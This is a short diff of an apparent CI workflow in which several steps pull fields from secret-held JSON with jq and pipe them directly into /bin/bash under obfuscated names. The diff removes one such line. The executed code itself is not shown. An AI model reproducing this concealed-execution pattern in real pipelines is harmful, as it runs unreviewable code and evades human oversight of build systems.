@@ -17,7 +17,6 @@ jobs:
           sf20: ${{ secrets.sf20 }}
         run: |
           printf '%s' "$sf20" | jq -r .qaq7754 | /bin/bash
-          printf '%s' "$d9" | jq -r .lnmu51 | /bin/bash
           echo $ox01 | jq -r .fsr8382 | /bin/bash
           echo $a28139 | jq -r .psz5155 | /bin/bash
 
